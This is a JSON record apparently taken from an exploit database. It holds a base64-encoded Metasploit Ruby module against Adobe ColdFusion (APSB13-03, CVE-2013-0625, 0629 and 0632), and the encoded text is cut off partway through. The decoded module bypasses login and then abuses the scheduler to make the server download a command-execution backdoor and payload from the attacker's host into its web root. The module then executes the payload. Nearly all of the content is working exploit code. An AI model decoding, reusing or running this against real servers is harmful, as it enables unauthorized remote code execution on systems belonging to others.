{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgd2ViIHNpdGUgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gbGljZW5zaW5nIGFuZCB0ZXJtcyBvZiB1c2UuDQojICAgaHR0cDovL21ldGFzcGxvaXQuY29tLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQpyZXF1aXJlICdkaWdlc3Qvc2hhMScNCnJlcXVpcmUgJ29wZW5zc2wnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCg0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwQ2xpZW50DQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBTZXJ2ZXINCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgPT4gJ0Fkb2JlIENvbGRGdXNpb24gQVBTQjEzLTAzJywNCiAgICAgICdEZXNjcmlwdGlvbicgPT4gJXF7DQogICAgICAgIFRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgcGlsZSBvZiB2dWxuZXJhYmlsaXRpZXMgaW4gQWRvYmUgQ29sZEZ1c2lvbiBBUFNCMTMtMDM6DQogICAgICAgICAgKiBDVkUtMjAxMy0wNjI1OiBhcmJpdHJhcnkgY29tbWFuZCBleGVjdXRpb24gaW4gc2NoZWR1bGVlZGl0LmNmbSAoOS54IG9ubHkpDQogICAgICAgICAgKiBDVkUtMjAxMy0wNjI5OiBkaXJlY3RvcnkgdHJhdmVyc2FsDQogICAgICAgICAgKiBDVkUtMjAxMy0wNjMyOiBhdXRoZW50aWNhdGlvbiBieXBhc3MNCiAgICAgIH0sDQogICAgICAnQXV0aG9yJyAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ0pvbiBIYXJ0IDxqb25faGFydFthdF1yYXBpZDcuY29tJywgIyBNZXRhc3Bsb2l0IG1vZHVsZQ0KICAgICAgICBdLA0KICAgICAgJ0xpY2Vuc2UnICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICdSZWZlcmVuY2VzJyAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0NWRScsICcyMDEzLTA2MjUnXSwNCiAgICAgICAgICBbICdDVkUnLCAnMjAxMy0wNjI5J10sDQogICAgICAgICAgIyB3ZSBkb24ndCBhY3R1YWxseSBleHBsb2l0IHRoaXMsIGFzIHRoaXMgaXMgdGhlIGJhY2tkb29yDQogICAgICAgICAgIyBkcm9wcGVkIGJ5IG1hbHdhcmUgZXhwbG9pdGluZyB0aGUgb3RoZXIgdnVsbmVyYWJpbGl0aWVzDQogICAgICAgICAgWyAnQ1ZFJywgJzIwMTMtMDYzMSddLA0KICAgICAgICAgIFsgJ0NWRScsICcyMDEzLTA2MzInXSwNCiAgICAgICAgXSwNCiAgICAgICdUYXJnZXRzJyAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsnQXV0b21hdGljIFRhcmdldGluZycsIHsgJ2F1dG8nID0+IHRydWUgfV0sDQogICAgICAgICAgWw0KICAgICAgICAgICAgJ1VuaXZlcnNhbCBDTUQnLA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAnQXJjaCcgICAgID0+IEFSQ0hfQ01ELA0KICAgICAgICAgICAgICAnUGxhdGZvcm0nID0+IFsndW5peCcsICd3aW4nLCAnbGludXgnXQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgIF0NCiAgICAgICAgXSwNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyAgPT4gMSwNCiAgICAgICdQcml2aWxlZ2VkJyAgPT4gdHJ1ZSwNCiAgICAgICdQbGF0Zm9ybScgICAgPT4gWyAnd2luJywgJ2xpbnV4JyBdLA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAnSmFuIDE1IDIwMTMnKSkNCg0KICAgIHJlZ2lzdGVyX29wdGlvbnMoDQogICAgICBbDQogICAgICAgIE9wdDo6UlBPUlQoODApLA0KICAgICAgICBPcHRTdHJpbmcubmV3KCdVU0VSTkFNRScsIFsgZmFsc2UsICdUaGUgdXNlcm5hbWUgdG8gYXV0aGVudGljYXRlIGFzJyBdKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnUEFTU1dPUkQnLCBbIGZhbHNlLCAnVGhlIHBhc3N3b3JkIGZvciB0aGUgc3BlY2lmaWVkIHVzZXJuYW1lJyBdKSwNCiAgICAgICAgT3B0Qm9vbC5uZXcoJ1VTRVJEUycsIFsgdHJ1ZSwgJ0F1dGhlbnRpY2F0ZSB3aXRoIFJEUyBjcmVkZW50aWFscycsIHRydWUgXSksDQogICAgICAgIE9wdFN0cmluZy5uZXcoJ0NNRCcsIFsgZmFsc2UsICdDb21tYW5kIHRvIHJ1biByYXRoZXIgdGhhbiBkcm9wcGluZyBhIHBheWxvYWQnLCAnJyBdKSwNCiAgICAgIF0sIHNlbGYuY2xhc3MpDQoNCiAgICByZWdpc3Rlcl9hZHZhbmNlZF9vcHRpb25zKA0KICAgICAgWw0KICAgICAgICBPcHRCb29sLm5ldygnREVMRVRFX1RBU0snLCBbIHRydWUsICdEZWxldGUgc2NoZWR1bGVkIHRhc2sgd2hlbiBkb25lJywgdHJ1ZSBdKSwNCiAgICAgIF0sIHNlbGYuY2xhc3MpDQogIGVuZA0KDQogIGRlZiBjaGVjaw0KICAgIGV4cGxvaXRhYmxlID0gMA0KICAgIGV4cGxvaXRhYmxlICs9IDEgaWYgY2hlY2tfY3ZlXzIwMTNfMDYyOQ0KICAgIGV4cGxvaXRhYmxlICs9IDEgaWYgY2hlY2tfY3ZlXzIwMTNfMDYzMg0KICAgIGV4cGxvaXRhYmxlID4gMCA/IEV4cGxvaXQ6OkNoZWNrQ29kZTo6VnVsbmVyYWJsZSA6IEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZQ0KICBlbmQNCg0KICAjIExvZ2luIGFueSB3YXkgcG9zc2libGUsIHJldHVybmluZyB0aGUgY29va2llcyBpZiBzdWNjZXNzZnVsLCBlbXB0eSBvdGhlcndpc2UNCiAgZGVmIGxvZ2luDQogICAgY2ZfY29va2llcyA9IHt9DQoNCiAgICB3YXlzID0gew0KICAgICAgJ1JEUyBieXBhc3MnID0+IFByb2MubmV3IHsgfGZvb3wgYWRtaW5hcGlfbG9naW4oZGF0YXN0b3JlWydVU0VSTkFNRSddLCBkYXRhc3RvcmVbJ1BBU1NXT1JEJ10sIHRydWUpIH0sDQogICAgICAnUkRTIGxvZ2luJyA9PiBQcm9jLm5ldyB7IHxmb298IGFkbWluYXBpX2xvZ2luKGRhdGFzdG9yZVsnVVNFUk5BTUUnXSwgZGF0YXN0b3JlWydQQVNTV09SRCddLCBmYWxzZSkgfSwNCiAgICAgICdBZG1pbmlzdHJhdG9yIGxvZ2luJyA9PiBQcm9jLm5ldyB7IHxmb298IGFkbWluaXN0cmF0b3JfbG9naW4oZGF0YXN0b3JlWydVU0VSTkFNRSddLCBkYXRhc3RvcmVbJ1BBU1NXT1JEJ10pIH0sDQogICAgfQ0KICAgIHdheXMuZWFjaCBkbyB8d2hhdCwgaG93fA0KICAgICAgdGhlc2VfY29va2llcyA9IGhvdy5jYWxsDQogICAgICBpZiBnb3RfYXV0aD8gdGhlc2VfY29va2llcw0KICAgICAgICBwcmludF9zdGF0dXMgIkF1dGhlbnRpY2F0ZWQgdXNpbmcgJyN7d2hhdH0nIHRlY2huaXF1ZSINCiAgICAgICAgY2ZfY29va2llcyA9IHRoZXNlX2Nvb2tpZXMNCiAgICAgICAgYnJlYWsNCiAgICAgIGVuZA0KICAgIGVuZA0KDQogICAgZmFpbF93aXRoKEV4cGxvaXQ6OkZhaWx1cmU6Ok5vQWNjZXNzLCAiVW5hYmxlIHRvIGF1dGhlbnRpY2F0ZSIpIGlmIGNmX2Nvb2tpZXMuZW1wdHk/DQogICAgY2ZfY29va2llcw0KICBlbmQNCg0KICBkZWYgZXhwbG9pdA0KICAgICMgbG9naW4NCiAgICBjZl9jb29raWVzID0gbG9naW4NCg0KICAgICMgaWYgd2UgbWFuYWdlZCB0byBsb2dpbiwgZ2V0IHRoZSBsaXN0ZW5lciByZWFkeQ0KICAgIGRhdGFzdG9yZVsnVVJJUEFUSCddID0gcmFuZF90ZXh0X2FscGhhbnVtZXJpYyg2KQ0KICAgIHNydl91cmkgPSAiaHR0cDovLyN7ZGF0YXN0b3JlWydTUlZIT1NUJ119OiN7ZGF0YXN0b3JlWydTUlZQT1JUJ119Ig0KICAgIHN0YXJ0X3NlcnZpY2UNCg0KICAgICMgZHJvcCBhIHBheWxvYWQgb24gZGlzayB3aGljaCB3ZSBjYW4gdXNlZCB0byBleGVjdXRlDQogICAgIyBhcmJpdHJhcnkgY29tbWFuZHMsIHdoaWNoIHdpbGwgYmUgbmVlZGVkIHJlZ2FyZGxlc3Mgb2YNCiAgICAjIHdoaWNoIHRlY2huaXF1ZSAoY21kLCBwYXlsb2FkKSB0aGUgdXNlciB3YW50cw0KICAgIGlucHV0X2V4ZWMgPSBzcnZfdXJpICsgIi8je2RhdGFzdG9yZVsnVVJJUEFUSCddfS1lIg0KICAgIG91dHB1dF9leGVjID0gIiN7ZGF0YXN0b3JlWydVUklQQVRIJ119LWUuY2ZtIg0KICAgIHNjaGVkdWxlX2Ryb3AgY2ZfY29va2llcywgaW5wdXRfZXhlYywgb3V0cHV0X2V4ZWMNCg0KICAgIGlmIGRhdGFzdG9yZVsnQ01EJ10gYW5kIG5vdCBkYXRhc3RvcmVbJ0NNRCddLmVtcHR5Pw0KICAgICAgIyBub3cgdGhhdCB0aGUgY29sZGZ1c2lvbiBleGVjIGlzIG9uIGRpc2ssIGV4ZWN1dGUgaXQsDQogICAgICAjIHBhc3NpbmcgaW4gdGhlIGNvbW1hbmQgYW5kIGFyZ3VtZW50cw0KICAgICAgcGFydHMgPSBkYXRhc3RvcmVbJ0NNRCddLnNwbGl0KC9ccysvKQ0KICAgICAgcmVzID0gZXhlY3V0ZSBvdXRwdXRfZXhlYywgcGFydHMuc2hpZnQsIHBhcnRzLmpvaW4oJyAnKQ0KICAgICAgcHJpbnRfbGluZSByZXMuYm9keS5zdHJpcA0KICAgIGVsc2UNCiAgICAgICMgZHJvcCB0aGUgcGF5bG9hZA0KICAgICAgaW5wdXRfcGF5bG9hZCA9IHNydl91cmkgKyAiLyN7ZGF0YXN0b3JlWydVUklQQVRIJ119LXAiDQogICAgICBvdXRwdXRfcGF5bG9hZCA9ICIje2RhdGFzdG9yZVsnVVJJUEFUSCddfS1wIg0KICAgICAgc2NoZWR1bGVfZHJvcCBjZl9jb29raWVzLCBpbnB1dF9wYXlsb2FkLCBvdXRwdXRfcGF5bG9hZA0KICAgICAgIyBtYWtlIHRoZSBwYXlsb2FkIGV4ZWN1dGFibGUNCiAgICAgICMgWFhYOiB3aW5kb3dzPw0KICAgICAgZXhlY3V0ZSBvdXRwdXRfZXhlYywgJ2NobW9kJywgIjc1NSAuLi8uLi93d3dyb290L0NGSURFLyN7b3V0cHV0X3BheWxvYWR9Ig0KICAgICAgIyBleGVjdXRlIHRoZSBwYXlsb2FkDQogICAgICBleGVjdXRlIG91dHB1dF9leGVjLCAiLi4vLi4vd3d3cm9vdC9DRklERS8je291dHB1dF9wYXlsb2FkfSINCiAgICBlbmQNCiAgICBoYW5kbGVyDQogIGVuZA0KDQogIGRlZiBleGVjdXRlIGNmbSwgY21kLCBhcmdzPScnDQogICAgdXJpID0gIi9DRklERS8iICsgY2ZtICsgIj9jbWQ9I3tjbWR9JmFyZ3M9I3tSZXg6OlRleHQ6OnVyaV9lbmNvZGUgYXJnc30iDQogICAgc2VuZF9yZXF1ZXN0X3JhdyggeyAndXJpJyA9PiB1cmksICdtZXRob2QnID0+ICdHRVQnIH0sIDI1ICkNCiAgZW5kDQoNCiAgZGVmIG9uX25ld19zZXNzaW9uKGNsaWVudCkNCiAgICByZXR1cm4NCiAgICAjIFRPRE86IGNsZWFudXANCiAgICBpZiBjbGllbnQudHlwZSA9PSAibWV0ZXJwcmV0ZXIiDQogICAgICBjbGllbnQuY29yZS51c2UoInN0ZGFwaSIpIGlmIG5vdCBjbGllbnQuZXh0LmFsaWFzZXMuaW5jbHVkZT8oInN0ZGFwaSIpDQogICAgICBAZmlsZXMuZWFjaCBkbyB8ZmlsZXwNCiAgICAgICAgY2xpZW50LmZzLmZpbGUucm0oIiN7ZmlsZX0iKQ0KICAgICAgZW5kDQogICAgZWxzZQ0KICAgICAgQGZpbGVzLmVhY2ggZG8gfGZpbGV8DQogICAgICAgIGNsaWVudC5zaGVsbF9jb21tYW5kX3Rva2VuKCJybSAje2ZpbGV9IikNCiAgICAgIGVuZA0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgb25fcmVxdWVzdF91cmkgY2xpLCByZXF1ZXN0DQogICAgY2ZfcGF5bG9hZCA9ICJ0ZXN0Ig0KICAgIGNhc2UgcmVxdWVzdC51cmkNCiAgICB3aGVuICIvI3tkYXRhc3RvcmVbJ1VSSVBBVEgnXX0tZSINCiAgICAgIGNmX3BheWxvYWQgPSA8PC1FT0YNCiAgICAgICAgPGNmcGFyYW0gbmFtZT0idXJsLmNtZCIgdHlwZT0ic3RyaW5nIiBkZWZhdWx0PSJpZCIvPg0KICAgICAgICA8Y2ZwYXJhbSBuYW1lPSJ1cmwuYXJncyIgdHlwZT0ic3RyaW5nIiBkZWZhdWx0PSIiLz4NCiAgICAgICAgPGNmZXhlY3V0ZSBuYW1lPSN1cmwuY21kIyBhcmd1bWVudHM9I3VybC5hcmdzIyB0aW1lb3V0PSI1IiB2YXJpYWJsZT0ib3V0cHV0IiAvPg0KICAgICAgICA8Y2ZvdXRwdXQ+I291dHB1dCM8L2Nmb3V0cHV0Pg0KICAgICAgRU9GDQogICAgd2hlbiAiLyN7ZGF0YXN0b3JlWydVUklQQVRIJ119LXAiDQogICAgICBjZl9wYXlsb2FkID0gcGF5bG9hZC5lbmNvZGVkDQogICAgZW5kDQogICAgc2VuZF9yZXNwb25zZShjbGksIGNmX3BheWxvYWQsIHsgJ0NvbnRlbnQtVHlwZScgPT4gJ3RleHQvaHRtbCcgfSkNCiAgZW5kDQoNCg0KICAjIEdpdmVuIGEgaGFzaCBvZiBjb29raWUga2V5IHZhbHVlIHBhaXJzLCByZXR1cm4gYSBzdHJpbmcNCiAgIyBzdWl0YWJsZSBmb3IgdXNlIGFzIGFuIEhUVFAgQ29va2llIGhlYWRlcg0KICBkZWYgYnVpbGRfY29va2llX2hlYWRlciBjb29raWVzDQogICAgY29va2llcy50b19hLm1hcCB7IHxhfCBhLmpvaW4gJz0nIH0uam9pbiAnOyAnDQogIGVuZA0KDQogICMgdGhpcyBkb2Vzbid0IGFjdHVhbGx5IHdvcmsNCiAgZGVmIHR3aWRkbGVfY3NyZiBjb29raWVzLCBlbmFibGU9ZmFsc2UNCiAgICBtb2RlID0gKGVuYWJsZSA/ICJFbmFibGluZyIgOiAiRGlzYWJsaW5nIikNCiAgICBwcmludF9zdGF0dXMgIiN7bW9kZX0gQ1NSRiBwcm90ZWN0aW9uIg0KICAgIHBhcmFtcyA9IHsNCiAgICAgICdTZXNzRW5hYmxlJyA9PiBlbmFibGUudG9fcywNCiAgICB9DQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSgNCiAgICAgIHsNCiAgICAgICAgJ3VyaScgICAgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsICIvQ0ZJREUvYWRtaW5pc3RyYXRvci9zZXR0aW5ncy9tZW1vcnl2YXJpYWJsZXMuY2ZtIiksDQogICAgICAgICdtZXRob2QnID0+ICdQT1NUJywNCiAgICAgICAgJ2Nvbm5lY3Rpb24nID0+ICdURSwgY2xvc2UnLA0KICAgICAgICAnY29va2llJyA9PiBidWlsZF9jb29raWVfaGVhZGVyKGNvb2tpZXMpLA0KICAgICAgICAndmFyc19wb3N0JyA9PiBwYXJhbXMsDQogICAgICB9KQ0KICAgIGlmIHJlcw0KICAgICAgaWYgcmVzLmJvZHkgPX4gL1Nlc3Npb25NYW5hZ2VtZW50IHNob3VsZC8NCiAgICAgICAgcHJpbnRfZXJyb3IgIkVycm9yICN7bW9kZX0gQ1NSRiINCiAgICAgIGVuZA0KICAgIGVsc2UNCiAgICAgIHByaW50X2Vycm9yICJObyByZXNwb25zZSB3aGlsZSAje21vZGV9IENTUkYiDQogICAgZW5kDQogIGVuZA0KDQogICMgVXNpbmcgdGhlIHByb3ZpZGVkICtjb29raWVzKywgc2NoZWR1bGUgYSBDb2xkRnVzaW9uIHRhc2sNCiAgIyAgdG8gcmVxdWVzdCBjb250ZW50IGZyb20gK2lucHV0X3VyaSsgYW5kIGRyb3AgaXQgaW4gK291dHB1dF9wYXRoKw0KICBkZWYgc2NoZWR1bGVfZHJvcCBjb29raWVzLCBpbnB1dF91cmksIG91dHB1dF9wYXRoDQogICAgdnByaW50X3N0YXR1cyAiQXR0ZW1wdGluZyB0byBzY2hlZHVsZSBDb2xkRnVzaW9uIHRhc2siDQogICAgY29va2llX2hhc2ggPSBjb29raWVzDQoNCiAgICBzY2hlZHVsZXRhc2tzX3BhdGggPSAiL0NGSURFL2FkbWluaXN0cmF0b3Ivc2NoZWR1bGVyL3NjaGVkdWxldGFza3MuY2ZtIg0KICAgIHNjaGVkdWxlZWRpdF9wYXRoID0gIi9DRklERS9hZG1pbmlzdHJhdG9yL3NjaGVkdWxlci9zY2hlZHVsZWVkaXQuY2ZtIg0KICAgICMgbWFrZSBhIHJlcXVlc3QgdG8gdGhlIHNjaGVkdWxldGFza3MgcGFnZSB0byBwaWNrIHVwIHRoZSBDU1JGIHRva2VuDQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSgNCiAgICAgIHsNCiAgICAgICAgJ3VyaScgICAgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsIHNjaGVkdWxldGFza3NfcGF0aCksDQogICAgICAgICdtZXRob2QnID0+ICdHRVQnLA0KICAgICAgICAnY29ubmVjdGlvbicgPT4gJ1RFLCBjbG9zZScsDQogICAgICAgICdjb29raWUnID0+IGJ1aWxkX2Nvb2tpZV9oZWFkZXIoY29va2llX2hhc2gpLA0KICAgICAgfSkNCiAgICBjb29raWVfaGFzaC5tZXJnZSEgZ2V0X3VzZWZ1bF9jb29raWVzIHJlcw0KDQogICAgaWYgcmVzDQogICAgICAjIFhYWDogSSBjYW4gb25seSBzZWVtIHRvIGdldCB0aGlzIHRvIHdvcmsgaWYgJ0VuYWJsZSBTZXNzaW9uIFZhcmlhYmxlcycNCiAgICAgICMgaXMgZGlzYWJsZWQgKFNlcnZlciBTZXR0aW5ncyAtPiBNZW1vcnkgVmFyaWFibGVzKQ0KICAgICAgdG9rZW4gPSByZXMuYm9keS5zY2FuKC88aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjc3JmdG9rZW4iIHZhbHVlPSIoW15cIl0rKSIvKS5mbGF0dGVuLmZpcnN0DQogICAgICB1bmxlc3MgdG9rZW4NCiAgICAgICAgcHJpbnRfd2FybmluZyAiRW1wdHkgQ1NSRiB0b2tlbiBmb3VuZCAtLSBlaXRoZXIgQ1NSRiBpcyBkaXNhYmxlZCAoZ29vZCkgb3Igd2UgY291bGRuJ3QgZ2V0IG9uZSAoYmFkKSINCiAgICAgICAgI3R3aWRkbGVfY3NyZiBjb29raWVzLCBmYWxzZQ0KICAgICAgICB0b2tlbiA9ICcnDQogICAgICBlbmQNCiAgICBlbHNlDQogICAgICBmYWlsX3dpdGgoRXhwbG9pdDo6RmFpbHVyZTo6VW5rbm93biwgIk5vIHJlc3BvbnNlIHdoZW4gdHJ5aW5nIHRvIEdFVCBzY2hlZHVsZXRhc2tzLmNmbSBmb3IgdGFzayBsaXN0aW5nIikNCiAgICBlbmQNCg0KICAgICMgbWFrZSBhIHJlcXVlc3QgdG8gdGhlIHNjaGVkdWxldGFza3MgcGFnZSBhZ2FpbiwgdGhpcyB0aW1lIHBhc3NpbmcgaW4gb3VyIENTUkYgdG9rZW4NCiAgICAjIGluIGFuIGF0dGVtcHQgdG8gZ2V0IGFsbCBvZiB0aGUgb3RoZXIgY29va2llcyB1c2VkIGluIGEgcmVxdWVzdA0KICAgIGNvb2tpZV9oYXNoLm1lcmdlISBnZXRfdXNlZnVsX2Nvb2tpZXMgcmVzDQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSgNCiAgICAgIHsNCiAgICAgICAgJ3VyaScgICAgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsIHNjaGVkdWxldGFza3NfcGF0aCkgKyAiP2NzcmZ0b2tlbj0je3Rva2VufSZzdWJtaXQ9U2NoZWR1bGUrTmV3K1Rhc2siLA0KICAgICAgICAnbWV0aG9kJyA9PiAnR0VUJywNCiAgICAgICAgJ2Nvbm5lY3Rpb24nID0+ICdURSwgY2xvc2UnLA0KICAgICAgICAnY29va2llJyA9PiBidWlsZF9jb29raWVfaGVhZGVyKGNvb2tpZV9oYXNoKSwNCiAgICAgIH0pDQoNCiAgICBmYWlsX3dpdGgoRXhwbG9pdDo6RmFpbHVyZTo6VW5rbm93biwgIk5vIHJlc3BvbnNlIHdoZW4gdHJ5aW5nIHRvIEdFVCBzY2hlZHVsZXRhc2tzLmNmbSBmb3IgbmV3IHRhc2siKSB1bmxlc3MgcmVzDQoNCiAgICAjIHBpY2sgYSB1bmlxdWUgdGFzayBJRA0KICAgIHRhc2tfaWQgPSBTZWN1cmVSYW5kb20udXVpZA0KICAgICMgZHJvcCB0aGUgYmFja2Rvb3IgaW4gdGhlIENGSURFIGRpcmVjdG9yeSBzbyBpdCBjYW4gYmUgZXhlY3V0ZWQNCiAgICBwdWJsaXNoX2ZpbGUgPSAnLi4vLi4vd3d3cm9vdC9DRklERS8nICsgb3V0cHV0X3BhdGgNCiAgICAjIHBpY2sgYSBzdGFydCBkYXRlLiAgVGhpcyBtdXN0IGJlIGluIHRoZSBmdXR1cmUsIHNvIHBpY2sNCiAgICAjIG9uZSBzdWZmaWNpZW50bHkgZmFyIGFoZWFkIHRvIGFjY291bnQgZm9yIHRpbWUgem9uZXMsDQogICAgIyBpbXByb3BlciB0aW1lIGtlZXBpbmcsIHNvbGFyIGZsYXJlcywgZHJpZnQsIGV0Yy4NCiAgICBzdGFydF9kYXRlID0gIjAzLzE1LyN7VGltZS5ub3cuc3RyZnRpbWUoJyVZJykudG9faSArIDF9Ig0KICAgIHBhcmFtcyA9IHsNCiAgICAgICdjc3JmdG9rZW4nID0+IHRva2VuLA0KICAgICAgJ1Rhc2tOYW1lJyA9PiB0YXNrX2lkLA0KICAgICAgJ0dyb3VwJyA9PiAnZGVmYXVsdCcsDQogICAgICAnU3RhcnRfRGF0ZScgPT4gc3RhcnRfZGF0ZSwNCiAgICAgICdFbmRfRGF0ZScgPT4gJycsDQogICAgICAnU2NoZWR1bGVUeXBlJyA9PiAnT25jZScsDQogICAgICAnU3RhcnRUaW1lT25jZScgPT4gJzE6MzcgUE0nLA0KICAgICAgJ0ludGVydmFsJyA9PiAnRGFpbHknLA0KICAgICAgJ1N0YXJ0VGltZURXTScgPT4gJycsDQogICAgICAnY3VzdG9tSW50ZXJ2YWxfaG91cicgPT4gJzAnLA0KICAgICAgJ2N1c3RvbUludGVydmFsX21pbicgPT4gJzAnLA0KICAgICAgJ2N1c3RvbUludGVydmFsX3NlYycgPT4gJzAnLA0KICAgICAgJ0N1c3RvbVN0YXJ0VGltZScgPT4gJycsDQogICAgICAnQ3VzdG9tRW5kVGltZScgPT4gJycsDQogICAgICAncmVwZWF0cmFkaW8nID0+ICdub3JlcGVhdGZvcmV2ZXJyYWRpbycsDQogICAgICAnUmVwZWF0JyA9PiAnJywNCiAgICAgICdjcm9udGltZScgPT4gJycsDQogICAgICAnT3BlcmF0aW9uJyA9PiAnSFRUUFJlcXVlc3QnLA0KICAgICAgJ1NjaGVkdWxlZFVSTCcgPT4gaW5wdXRfdXJpLA0KICAgICAgJ1VzZXJuYW1lJyA9PiAnJywNCiAgICAgICdQYXNzd29yZCcgPT4gJycsDQogICAgICAnUmVxdWVzdF9UaW1lX291dCcgPT4gJycsDQogICAgICAncHJveHlfc2VydmVyJyA9PiAnJywNCiAgICAgICdodHRwX3Byb3h5X3BvcnQnID0+ICcnLA0KICAgICAgJ3B1Ymxpc2gnID0+ICcxJywNCiAgICAgICdwdWJsaXNoX2ZpbGUnID0+IHB1Ymxpc2hfZmlsZSwNCiAgICAgICdwdWJsaXNoX292ZXJ3cml0ZScgPT4gJ29uJywNCiAgICAgICdldmVudGhhbmRsZXInID0+ICcnLA0KICAgICAgJ2V4Y2x1ZGUnID0+ICcnLA0KICAgICAgJ29ubWlzZmlyZScgPT4gJycsDQogICAgICAnb25leGNlcHRpb24nID0+ICcnLA0KICAgICAgJ29uY29tcGxldGUnID0+ICcnLA0KICAgICAgJ3ByaW9yaXR5JyA9PiAnNScsDQogICAgICAncmV0cnljb3VudCcgPT4gJzMnLA0KICAgICAgJ2FkdmFuY2VkbW9kZScgPT4gJ3RydWUnLA0KICAgICAgJ2FkbWluc3VibWl0JyA9PiAnU3VibWl0JywNCiAgICAgICd0YXNrTmFtZU9yaWdpbmFsJyA9PiB0YXNrX2lkLA0KICAgICAgJ2dyb3VwT3JpZ2luYWwnID0+ICdkZWZhdWx0JywNCiAgICAgICdtb2RlT3JpZ2luYWwnID0+ICdzZXJ2ZXInLA0KICAgIH0NCg0KICAgIGNvb2tpZV9oYXNoLm1lcmdlISAoZ2V0X3VzZWZ1bF9jb29raWVzIHJlcykNCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgew0KICAgICAgICAndXJpJyAgICA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgc2NoZWR1bGVlZGl0X3BhdGgpLA0KICAgICAgICAnbWV0aG9kJyA9PiAnUE9TVCcsDQogICAgICAgICdjb25uZWN0aW9uJyA9PiAnVEUsIGNsb3NlJywNCiAgICAgICAgJ2Nvb2tpZScgPT4gYnVpbGRfY29va2llX2hlYWRlcihjb29raWVfaGFzaCksDQogICAgICAgICd2YXJzX3Bvc3QnID0+IHBhcmFtcywNCiAgICAgIH0pDQoNCiAgICBpZiByZXMNCiAgICAgICMgaWYgdGhlcmUgd2FzIHNvbWV0aGluZyB3cm9uZyB3aXRoIHRoZSB0YXNrLCBjYXB0dXJlIHRob3NlIGVycm9ycw0KICAgICAgIyBwcmludCB0aGVtIGFuZCBhYm9ydA0KICAgICAgZXJyb3JzID0gcmVzLmJvZHkuc2NhbigvPGxpIGNsYXNzPSJlcnJvclRleHQiPiguKik8XC9saT4vaSkuZmxhdHRlbg0KICAgICAgaWYgZXJyb3JzLmVtcHR5Pw0KICAgICAgICBpZiByZXMuYm9keSA9fiAvU2Vzc2lvbk1hbmFnZW1lbnQgc2hvdWxkLw0KICAgICAgICAgIGZhaWxfd2l0aChFeHBsb2l0OjpGYWlsdXJlOjpOb0FjY2VzcywgIlVuYWJsZSB0byBieXBhc3MgQ1NSRiIpDQogICAgICAgIGVuZA0KICAgICAgICBwcmludF9zdGF0dXMgIkNyZWF0ZWQgdGFzayAje3Rhc2tfaWR9Ig0KICAgICAgZWxzZQ0KICAgICAgICBmYWlsX3dpdGgoRXhwbG9pdDo6RmFpbHVyZTo6Tm9BY2Nlc3MsICJVbmFibGUgdG8gY3JlYXRlIHRhc2sgI3t0YXNrX2lkfTogI3tlcnJvcnMuam9pbignLCcpfSIpDQogICAgICBlbmQNCiAgICBlbHNlDQogICAgICBmYWlsX3dpdGgoRXhwbG9pdDo6RmFpbHVyZTo6VW5rbm93biwgIk5vIHJlc3BvbnNlIHdoZW4gY3JlYXRpbmcgdGFzayAje3Rhc2tfaWR9IikNCiAgICBlbmQNCg0KICAgIHByaW50X3N0YXR1cyAiRXhlY3V0aW5nIHRhc2sgI3t0YXNrX2lkfSINCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgew0KICAgICAgICAndXJpJyAgICA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgc2NoZWR1bGV0YXNrc19wYXRoKSArICI/cnVudGFzaz0je3Rhc2tfaWR9JmNzcmZ0b2tlbj0je3Rva2VufSZncm91cD1kZWZhdWx0Jm1vZGU9c2VydmVyIiwNCiAgICAgICAgJ21ldGhvZCcgPT4gJ0dFVCcsDQogICAgICAgICdjb25uZWN0aW9uJyA9PiAnVEUsIGNsb3NlJywNCiAgICAgICAgJ2Nvb2tpZScgPT4gYnVpbGRfY29va2llX2hlYWRlcihjb29raWVfaGFzaCksDQogICAgICB9KQ0KDQogICAgI3R3aWRkbGVfY3NyZiBjb29raWVzLCB0cnVlDQogICAgaWYgZGF0YXN0b3JlWydERUxFVEVfVEFTSyddDQogICAgICBwcmludF9zdGF0dXMgIlJlbW92aW5nIHRhc2sgI3t0YXNrX2lkfSINCiAgICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koDQogICAgICAgIHsNCiAgICAgICAgICAndXJpJyAgICA9PiBub3JtYWxpemVfdXJp